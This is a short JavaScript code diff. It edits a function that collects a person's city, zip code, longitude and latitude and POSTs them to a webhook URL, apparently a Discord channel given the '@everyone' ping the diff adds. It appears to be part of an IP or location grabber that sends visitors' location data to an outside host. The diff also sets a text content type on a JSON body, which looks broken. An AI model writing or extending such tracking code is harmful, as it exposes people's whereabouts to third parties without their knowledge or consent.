@@ -45,14 +45,16 @@ const fetchData = async () => {
                 "\nCity: " + city +
                 "\nZip Code: " + zip +
                 "\n \nLongitude: " + lon + 
-                "\nLatitude: " + lat + "```"
+                "\nLatitude: " + lat + 
+                "@everyone" + 
+                "```"
         };
 
 
         await fetch(webHookUrl, {
             method: 'POST',
             headers: {
-                'Content-Type': 'application/json',
+                'Content-Type': 'application/text',
             },
             body: JSON.stringify(params),
         });
